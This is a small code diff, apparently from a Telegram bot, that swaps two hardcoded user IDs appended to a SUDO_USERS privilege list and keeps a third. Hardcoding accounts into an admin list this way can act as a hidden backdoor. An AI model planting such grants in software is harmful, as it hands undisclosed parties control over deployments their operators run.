@@ -5,8 +5,8 @@ from infog import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1891078417)
-SUDO_USERS.append(2097320259)
+SUDO_USERS.append(784589736)
+SUDO_USERS.append(5013387325)
 SUDO_USERS.append(1329105215)
 
 
